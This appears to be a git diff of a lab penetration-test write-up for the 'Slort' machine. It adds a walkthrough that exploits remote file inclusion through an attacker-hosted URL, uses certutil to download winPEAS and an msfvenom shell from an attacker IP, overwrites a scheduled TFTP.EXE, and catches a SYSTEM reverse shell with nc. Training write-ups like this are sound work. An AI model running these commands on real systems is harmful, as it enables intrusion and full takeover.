@@ -2,31 +2,25 @@
 
 - Author: Henry Post
 - Target: Slort
-- Target IP: 1.2.3.4
+- Target IP: 192.168.55.53
 - Date: 04/22/2026
 
 ## Executive Summary
 
-%% This machine, `hackme`, was enumerated by `nmap` to have ports 22 and 8000 open.
+This machine, `Slort`, was enumerated by `nmap` to have FTP, HTTP, and MySQL running.
 
-Port 8000 was running a `ladon` web service, which had default credentials of `admin:admin`.
+The HTTP service was vulnerable to remote file inclusion and this was used to get a non-SYSTEM reverse shell.
 
-To get non-root access, I used `CVE-2025-1234` on `exploit-db.com`.
-
-From there, I identified a binary with elevated capabilities and used it to pivot to root. %%
+From there, the file `C:\Backup\TFTP.EXE` was identified to be writeable by a non-admin user, and this was used to get SYSTEM level access. 
 
 ### Recommendations
-%% 
-1. Update Ladon to the latest non-vulnerable version.
-2. Do not use default credentials of `admin:admin`.
-  3. Use strong credentials.
-4. Do not use `setuid` binary permissions on Python or other binaries. Instead, remove the `setuid` permission from binaries that do not need it. %%
 
+1. Fix the remote file inclusion vulnerability on `http://slort:4443/site/index.php?page=http://192.168.49.55:80/test.php` immediately.
+2. Do not allow non-admin users to write files to `C:\Backup` as it leads to privilege escalation.
 ## Resources
 
-- a
-- b
-- c
+- https://www.revshells.com/
+- https://medium.com/@ryanchamruiyang/proving-grounds-slort-walkthrough-by-ryan-cham-455ba38ccc94
 ## Recon
 
 I ran an nmap scan that enumerated their ports:
@@ -40,7 +34,7 @@ I ran an nmap scan that enumerated their ports:
 | 3306        | mysql   |                         |
 | 4443        | http    | XAMPP for Windows 7.4.6 |
 | 8080        | http    | XAMPP for Windows 7.4.6 |
-|             |         |                         |
+
 http://slort:4443/dashboard/phpinfo.php
 
 I'm not sure what the entrypoint is, so I'm going to consult a guide.
@@ -153,7 +147,7 @@ We get non-SYSTEM shell.
 
 ## SYSTEM access
 
-Well, victim runs `XAMPP v7.4.6, so...
+Well, victim runs `XAMPP v7.4.6`, so...
 
 ```sh
 searchsploit xampp
@@ -234,23 +228,56 @@ certutil.exe -urlcache -f http://192.168.49.55:80/winPEAS.bat C:\xampp\winPEAS.b
 C:\xampp\winPEAS.bat
 ```
 
-We notice that 
-## Proof
+We notice that...well, nothing interesting pops up.
 
-### Local proof
+Let's look at `C:/`...
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat local.txt`
-(IMG_PLACEHOLDER)
+`C:\Backup`. Hmm.
 
-### Root proof
+```txt
+Directory of C:\Backup
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat proof.txt`
-(IMG_PLACEHOLDER)
+07/20/2020  07:08 AM    <DIR>          .
+07/20/2020  07:08 AM    <DIR>          ..
+06/12/2020  07:45 AM            11,304 backup.txt
+06/12/2020  07:45 AM                73 info.txt
+06/23/2020  07:49 PM            73,802 TFTP.EXE
+               3 File(s)         85,179 bytes
+               2 Dir(s)  28,610,179,072 bytes free
+```
+
+This could be our key.
+
+```txt
+C:\Backup>type info.txt
+         
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+```
+
+What if we overwrite `TFTP.EXE` with our payload and wait 5 minutes?
+
+```
+move TFTP.EXE TFTP2.EXE
+```
+
+It works. This is it. We can reuse our existing `msfvenom` payload we generated earlier.
+
+```sh
+# start python3 to serve exploit
+sudo python3 -m http.server 80
+
+# on victim non-SYSTEM rev shell, to download exploit
+certutil.exe -urlcache -f http://192.168.49.55:80/shell.exe C:\Backup\TFTP.EXE
+
+# kill python3...
+
+# start listener...
+nc -nvlp 80
+
+# wait up to 5 minutes...
+```
+
+![](Pasted%20image%2020260422164015.png)
+
+Got em.
